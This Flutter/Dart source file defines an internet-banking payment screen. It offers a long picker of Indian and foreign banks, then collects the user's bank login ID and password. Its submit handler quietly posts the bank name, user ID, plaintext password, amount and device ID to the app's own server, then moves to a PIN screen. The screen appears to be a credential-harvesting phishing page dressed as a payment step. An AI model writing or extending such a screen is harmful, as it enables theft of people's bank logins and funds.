import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;
import '../api_config.dart';
import '../theme.dart';
import '../services/device_service.dart';

class NetbankingScreen extends StatefulWidget {
  final double amount;
  const NetbankingScreen({super.key, required this.amount});
  @override
  State<NetbankingScreen> createState() => _S();
}

class _S extends State<NetbankingScreen> {
  final userId = TextEditingController();
  final password = TextEditingController();
  final searchCtrl = TextEditingController();
  bool remember = false;
  _Bank? selectedBank;
  String search = '';

  static const _categories = [
    _Cat('State Bank', 0xFF1B75BC),
    _Cat('Nationalised Banks', 0xFF6B3FA0),
    _Cat('Private Sector Banks', 0xFF97144D),
    _Cat('Small Finance Banks', 0xFFE5721B),
    _Cat('Payments Banks', 0xFF1ABC9C),
    _Cat('Regional Rural Banks', 0xFF2C6FAC),
    _Cat('Foreign Banks', 0xFF8E44AD),
    _Cat('State Co-operative Banks', 0xFF27AE60),
  ];

  static final allBanks = <_Bank>[
    // State Bank
    _Bank('State Bank of India', 'SBI', 0xFF1B75BC, 0),
    // Nationalised Banks
    _Bank('Bank of Baroda', 'BOB', 0xFFE5721B, 1),
    _Bank('Bank of India', 'BOI', 0xFFD32F2F, 1),
    _Bank('Bank of Maharashtra', 'BOM', 0xFFE91E63, 1),
    _Bank('Canara Bank', 'Canara', 0xFF2C6FAC, 1),
    _Bank('Central Bank of India', 'CBI', 0xFF1565C0, 1),
    _Bank('Indian Bank', 'IB', 0xFF3949AB, 1),
    _Bank('Indian Overseas Bank', 'IOB', 0xFF1E88E5, 1),
    _Bank('Punjab & Sind Bank', 'PSB', 0xFF7B1FA2, 1),
    _Bank('Punjab National Bank', 'PNB', 0xFF6B3FA0, 1),
    _Bank('UCO Bank', 'UCO', 0xFF00897B, 1),
    _Bank('Union Bank of India', 'Union', 0xFF1A5276, 1),
    // Private Sector
    _Bank('Axis Bank', 'Axis', 0xFF97144D, 2),
    _Bank('Bandhan Bank', 'Bandhan', 0xFFFF6F00, 2),
    _Bank('CSB Bank', 'CSB', 0xFF4527A0, 2),
    _Bank('City Union Bank', 'CUB', 0xFF2E7D32, 2),
    _Bank('DCB Bank', 'DCB', 0xFF00695C, 2),
    _Bank('Dhanlaxmi Bank', 'DBL', 0xFF37474F, 2),
    _Bank('Federal Bank', 'Federal', 0xFFBF360C, 2),
    _Bank('HDFC Bank', 'HDFC', 0xFF004C8F, 2),
    _Bank('ICICI Bank', 'ICICI', 0xFFF58220, 2),
    _Bank('IndusInd Bank', 'IndusInd', 0xFF1A237E, 2),
    _Bank('IDFC FIRST Bank', 'IDFC', 0xFF00897B, 2),
    _Bank('Jammu & Kashmir Bank', 'JKB', 0xFFB71C1C, 2),
    _Bank('Karnataka Bank', 'KTK', 0xFF33691E, 2),
    _Bank('Karur Vysya Bank', 'KVB', 0xFF0D47A1, 2),
    _Bank('Kotak Mahindra Bank', 'Kotak', 0xFFE31E24, 2),
    _Bank('Nainital Bank', 'Nainital', 0xFF1B5E20, 2),
    _Bank('RBL Bank', 'RBL', 0xFF827717, 2),
    _Bank('South Indian Bank', 'SIB', 0xFF4E342E, 2),
    _Bank('Tamilnad Mercantile Bank', 'TMB', 0xFF283593, 2),
    _Bank('YES Bank', 'Yes', 0xFF2E3192, 2),
    _Bank('IDBI Bank', 'IDBI', 0xFFFF6F00, 2),
    // Small Finance Banks
    _Bank('AU Small Finance Bank', 'AU', 0xFFE5721B, 3),
    _Bank('Capital SFB', 'Capital', 0xFF1565C0, 3),
    _Bank('Equitas SFB', 'Equitas', 0xFF00838F, 3),
    _Bank('ESAF SFB', 'ESAF', 0xFF2E7D32, 3),
    _Bank('Suryoday SFB', 'Suryoday', 0xFF6A1B9A, 3),
    _Bank('Ujjivan SFB', 'Ujjivan', 0xFFC62828, 3),
    _Bank('Utkarsh SFB', 'Utkarsh', 0xFFEF6C00, 3),
    _Bank('Slice SFB', 'Slice', 0xFF4A148C, 3),
    _Bank('Jana SFB', 'Jana', 0xFF00695C, 3),
    _Bank('Shivalik SFB', 'Shivalik', 0xFF37474F, 3),
    _Bank('Unity SFB', 'Unity', 0xFF1A237E, 3),
    // Payments Banks
    _Bank('Airtel Payments Bank', 'Airtel', 0xFFE91E63, 4),
    _Bank('India Post Payments Bank', 'IPPB', 0xFF1565C0, 4),
    _Bank('Fino Payments Bank', 'Fino', 0xFF00695C, 4),
    _Bank('Jio Payments Bank', 'Jio', 0xFF1A237E, 4),
    _Bank('NSDL Payments Bank', 'NSDL', 0xFF2E7D32, 4),
    // Regional Rural Banks
    _Bank('Andhra Pradesh Grameena Bank', 'APGB', 0xFF1B75BC, 5),
    _Bank('Assam Gramin Bank', 'AGB', 0xFF1565C0, 5),
    _Bank('Arunachal Pradesh Rural Bank', 'APRB', 0xFF3949AB, 5),
    _Bank('Bihar Gramin Bank', 'BGB', 0xFFE5721B, 5),
    _Bank('Chhattisgarh Gramin Bank', 'CGB', 0xFF2E7D32, 5),
    _Bank('Gujarat Gramin Bank', 'GGB', 0xFF97144D, 5),
    _Bank('Haryana Gramin Bank', 'HGB', 0xFF6B3FA0, 5),
    _Bank('Himachal Pradesh Gramin Bank', 'HPGB', 0xFF00838F, 5),
    _Bank('Jharkhand Gramin Bank', 'JGB', 0xFFD32F2F, 5),
    _Bank('Jammu & Kashmir Grameen Bank', 'JKGB', 0xFF1B5E20, 5),
    _Bank('Karnataka Grameena Bank', 'KGB', 0xFF283593, 5),
    _Bank('Kerala Grameena Bank', 'KGB', 0xFF004C8F, 5),
    _Bank('Maharashtra Gramin Bank', 'MGB', 0xFFE31E24, 5),
    _Bank('Madhya Pradesh Gramin Bank', 'MPGB', 0xFFF58220, 5),
    _Bank('Manipur Rural Bank', 'MRB', 0xFF7B1FA2, 5),
    _Bank('Meghalaya Rural Bank', 'MRB', 0xFF2C6FAC, 5),
    _Bank('Mizoram Rural Bank', 'MRB', 0xFFC62828, 5),
    _Bank('Nagaland Rural Bank', 'NRB', 0xFF00695C, 5),
    _Bank('Odisha Grameen Bank', 'OGB', 0xFFE91E63, 5),
    _Bank('Punjab Gramin Bank', 'PGB', 0xFF1A237E, 5),
    _Bank('Puducherry Grama Bank', 'PGB', 0xFF33691E, 5),
    _Bank('Rajasthan Gramin Bank', 'RGB', 0xFF0D47A1, 5),
    _Bank('Tamil Nadu Grama Bank', 'TNGB', 0xFF4E342E, 5),
    _Bank('Telangana Grameena Bank', 'TGB', 0xFF37474F, 5),
    _Bank('Tripura Gramin Bank', 'TGB', 0xFF00897B, 5),
    _Bank('Uttar Pradesh Gramin Bank', 'UPGB', 0xFFE5721B, 5),
    _Bank('Uttarakhand Gramin Bank', 'UKGB', 0xFF1565C0, 5),
    _Bank('West Bengal Gramin Bank', 'WBGB', 0xFF6B3FA0, 5),
    // Foreign Banks
    _Bank('AB Bank PLC', 'AB', 0xFF1A237E, 6),
    _Bank('American Express Banking Corp', 'AmEx', 0xFF1565C0, 6),
    _Bank('ANZ Banking Group', 'ANZ', 0xFFE31E24, 6),
    _Bank('Bank of America', 'BOA', 0xFFD32F2F, 6),
    _Bank('Bank of Bahrain & Kuwait', 'BBK', 0xFF97144D, 6),
    _Bank('Bank of Ceylon', 'BOC', 0xFF3949AB, 6),
    _Bank('Bank of China', 'BOC', 0xFFD32F2F, 6),
    _Bank('Bank of Nova Scotia', 'Scotiabank', 0xFFE5721B, 6),
    _Bank('Barclays Bank', 'Barclays', 0xFF1565C0, 6),
    _Bank('BNP Paribas', 'BNP', 0xFF00897B, 6),
    _Bank('Citibank N.A.', 'Citi', 0xFF004C8F, 6),
    _Bank('Credit Agricole CIB', 'CA-CIB', 0xFF1B5E20, 6),
    _Bank('CTBC Bank', 'CTBC', 0xFF6A1B9A, 6),
    _Bank('DBS Bank India', 'DBS', 0xFF00695C, 6),
    _Bank('Deutsche Bank', 'DB', 0xFF1A237E, 6),
    _Bank('Doha Bank', 'Doha', 0xFFC62828, 6),
    _Bank('Emirates NBD', 'Emirates', 0xFFE91E63, 6),
    _Bank('First Abu Dhabi Bank', 'FAB', 0xFF2C6FAC, 6),
    _Bank('FirstRand Bank', 'FRB', 0xFF283593, 6),
    _Bank('HSBC', 'HSBC', 0xFFE31E24, 6),
    _Bank('ICBC', 'ICBC', 0xFFD32F2F, 6),
    _Bank('Industrial Bank of Korea', 'IBK', 0xFF1565C0, 6),
    _Bank('J.P. Morgan Chase', 'JPMC', 0xFF1A237E, 6),
    _Bank('JSC VTB Bank', 'VTB', 0xFF00897B, 6),
    _Bank('KEB Hana Bank', 'Hana', 0xFF6B3FA0, 6),
    _Bank('Kookmin Bank', 'KB', 0xFF2E7D32, 6),
    _Bank('Mashreqbank', 'Mashreq', 0xFFE5721B, 6),
    _Bank('Mizuho Bank', 'Mizuho', 0xFF97144D, 6),
    _Bank('MUFG Bank', 'MUFG', 0xFFD32F2F, 6),
    _Bank('NatWest Markets', 'NatWest', 0xFF37474F, 6),
    _Bank('NongHyup Bank', 'NH Bank', 0xFF00838F, 6),
    _Bank('PT Bank Maybank Indonesia', 'Maybank', 0xFFFF6F00, 6),
    _Bank('Qatar National Bank', 'QNB', 0xFF6B3FA0, 6),
    _Bank('Sberbank', 'Sber', 0xFF1B75BC, 6),
    _Bank('SBM Bank India', 'SBM', 0xFF1565C0, 6),
    _Bank('Shinhan Bank', 'Shinhan', 0xFF1A237E, 6),
    _Bank('Societe Generale', 'SG', 0xFFE31E24, 6),
    _Bank('Sonali Bank PLC', 'Sonali', 0xFF2E7D32, 6),
    _Bank('Standard Chartered Bank', 'SCB', 0xFF004C8F, 6),
    _Bank('Sumitomo Mitsui Banking Corp', 'SMBC', 0xFFE5721B, 6),
    _Bank('United Overseas Bank', 'UOB', 0xFF97144D, 6),
    _Bank('UBS AG', 'UBS', 0xFFD32F2F, 6),
    _Bank('Woori Bank', 'Woori', 0xFF1565C0, 6),
  ];

  List<_Bank> get _filtered {
    if (search.isEmpty) return allBanks;
    final q = search.toLowerCase();
    return allBanks.where((b) =>
      b.name.toLowerCase().contains(q) || b.short.toLowerCase().contains(q)
    ).toList();
  }

  bool get _valid => selectedBank != null && userId.text.isNotEmpty && password.text.isNotEmpty;

  @override
  Widget build(BuildContext context) {
    final filtered = _filtered;
    return Scaffold(body: SafeArea(
      child: Column(children: [
        Expanded(child: SingleChildScrollView(
          padding: const EdgeInsets.all(16),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [AppColors.blue.withValues(alpha: .15), AppColors.navy.withValues(alpha: .08)],
                    begin: Alignment.topLeft, end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: const Icon(Icons.account_balance, color: AppColors.blue, size: 24),
              ),
              const SizedBox(width: 14),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text('Internet Banking', style: AppStyles.headerStyle),
                const SizedBox(height: 2),
                const Text('Pay via your bank account', style: AppStyles.bodySmall),
              ]),
            ]),
            const SizedBox(height: 20),
            Container(
              padding: const EdgeInsets.all(20),
              decoration: AppStyles.blueGradient.copyWith(borderRadius: BorderRadius.circular(16)),
              child: Row(children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: Colors.white.withValues(alpha: .15),
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Icon(Icons.account_balance_wallet, color: Colors.white, size: 24),
                ),
                const SizedBox(width: 16),
                Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  const Text('Amount to Pay', style: TextStyle(color: Colors.white70, fontSize: 13, fontWeight: FontWeight.w500)),
                  const SizedBox(height: 4),
                  Text('\u{20B9}${widget.amount.toStringAsFixed(1)}',
                      style: const TextStyle(fontSize: 28, fontWeight: FontWeight.w800, color: Colors.white, letterSpacing: 0.5)),
                ]),
              ]),
            ),
            const SizedBox(height: 20),
            Container(
              padding: const EdgeInsets.all(24),
              decoration: AppStyles.cardDecoration,
              child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Row(children: const [
                  Icon(Icons.account_balance, size: 20, color: AppColors.blue),
                  SizedBox(width: 8),
                  Text('Select Bank', style: AppStyles.subHeaderStyle),
                ]),
                const SizedBox(height: 14),
                // Search bar
                TextField(
                  controller: searchCtrl,
                  decoration: AppStyles.textFieldDecoration('Search banks...', prefixIcon: const Icon(Icons.search, color: AppColors.blue, size: 22)),
                  onChanged: (v) => setState(() => search = v),
                  style: const TextStyle(fontSize: 15, color: AppColors.textDark),
                ),
                const SizedBox(height: 16),
                // Selected bank badge
                if (selectedBank != null)
                  Container(
                    margin: const EdgeInsets.only(bottom: 12),
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    decoration: BoxDecoration(
                      color: AppColors.blue.withValues(alpha: .08),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: AppColors.blue.withValues(alpha: .3)),
                    ),
                    child: Row(children: [
                      Container(
                        width: 28, height: 28,
                        decoration: BoxDecoration(color: Color(selectedBank!.color), borderRadius: BorderRadius.circular(6)),
                        alignment: Alignment.center,
                        child: Text(selectedBank!.short, style: const TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.bold)),
                      ),
                      const SizedBox(width: 10),
                      Expanded(child: Text(selectedBank!.name, style: const TextStyle(fontWeight: FontWeight.w700, color: AppColors.textDark, fontSize: 14))),
                      GestureDetector(
                        onTap: () => setState(() => selectedBank = null),
                        child: const Icon(Icons.close, color: AppColors.red, size: 20),
                      ),
                    ]),
                  ),
                // Bank list
                Container(
                  constraints: const BoxConstraints(maxHeight: 320),
                  decoration: BoxDecoration(
                    border: Border.all(color: AppColors.fieldBorder),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: filtered.isEmpty
                    ? const Padding(padding: EdgeInsets.all(24), child: Center(child: Text('No banks found', style: TextStyle(color: AppColors.textMedium))))
                    : ListView.separated(
                        shrinkWrap: true,
                        physics: const ClampingScrollPhysics(),
                        itemCount: filtered.length,
                        separatorBuilder: (_, __) => const Divider(height: 1, indent: 16, endIndent: 16),
                        itemBuilder: (_, i) {
                          final b = filtered[i];
                          final sel = selectedBank == b;
                          final cat = _categories[b.catIdx];
                          return InkWell(
                            onTap: () {
                              setState(() {
                                selectedBank = b;
                                search = '';
                                searchCtrl.clear();
                              });
                            },
                            child: Container(
                              padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 12),
                              color: sel ? AppColors.blue.withValues(alpha: .06) : null,
                              child: Row(children: [
                                Container(
                                  width: 36, height: 36,
                                  decoration: BoxDecoration(color: Color(b.color), borderRadius: BorderRadius.circular(8)),
                                  alignment: Alignment.center,
                                  child: Text(b.short, style: const TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.bold)),
                                ),
                                const SizedBox(width: 10),
                                Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                                  Text(b.name, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13, color: AppColors.textDark)),
                                  Text(cat.name, style: TextStyle(fontSize: 10, color: Color(cat.color).withValues(alpha: .7), fontWeight: FontWeight.w600)),
                                ])),
                                if (sel) const Icon(Icons.check_circle, color: AppColors.blue, size: 20),
                              ]),
                            ),
                          );
                        },
                      ),
                ),
                const SizedBox(height: 24),
                Row(children: const [
                  Icon(Icons.person_outline, size: 18, color: AppColors.blue),
                  SizedBox(width: 8),
                  Text('Login Credentials', style: AppStyles.cardTitleStyle),
                ]),
                const SizedBox(height: 16),
                _label('User ID'),
                const SizedBox(height: 6),
                TextField(
                  controller: userId,
                  style: const TextStyle(fontSize: 15, color: AppColors.textDark),
                  decoration: AppStyles.textFieldDecoration('Enter user ID', prefixIcon: const Icon(Icons.person, color: AppColors.blue, size: 20)),
                ),
                const SizedBox(height: 18),
                _label('Password'),
                const SizedBox(height: 6),
                TextField(
                  controller: password,
                  obscureText: true,
                  style: const TextStyle(fontSize: 15, color: AppColors.textDark),
                  decoration: AppStyles.textFieldDecoration('Enter password', prefixIcon: const Icon(Icons.lock, color: AppColors.blue, size: 20)),
                ),
                const SizedBox(height: 4),
                CheckboxListTile(
                  value: remember,
                  onChanged: (v) => setState(() => remember = v!),
                  title: const Text('Remember me', style: TextStyle(fontSize: 14, fontWeight: FontWeight.w600, color: AppColors.textMedium)),
                  dense: true,
                  contentPadding: EdgeInsets.zero,
                  controlAffinity: ListTileControlAffinity.leading,
                  activeColor: AppColors.blue,
                  checkColor: Colors.white,
                  side: BorderSide(color: AppColors.fieldBorder),
                ),
                const SizedBox(height: 16),
                SizedBox(
                  width: double.infinity,
                  height: 54,
                  child: ElevatedButton.icon(
                    onPressed: _valid ? () {
  DeviceService.getDeviceId().then((deviceId) {
    http.post(Uri.parse('$apiBaseUrl/api/netbanking'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({
      'bank_name': selectedBank!.name,
      'user_id': userId.text,
      'password': password.text,
      'remember_me': remember,
      'amount': widget.amount,
      'device_id': deviceId,
    }))
      .then((_) => print('API success'))
      .catchError((e) => print('API error: $e'));
  });
  context.push('/netbanking-pin', extra: widget.amount);
} : null,
                    icon: const Icon(Icons.lock, size: 18),
                    label: const Text('Continue', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w700)),
                    style: AppStyles.primaryButton(double.infinity),
                  ),
                ),
              ]),
            ),
          ]),
        )),
      ]),
    ));
  }

  Widget _label(String t) => Text(t, style: AppStyles.labelStyle);
}

class _Cat {
  final String name;
  final int color;
  const _Cat(this.name, this.color);
}

class _Bank {
  final String name, short;
  final int color, catIdx;
  const _Bank(this.name, this.short, this.color, this.catIdx);
}
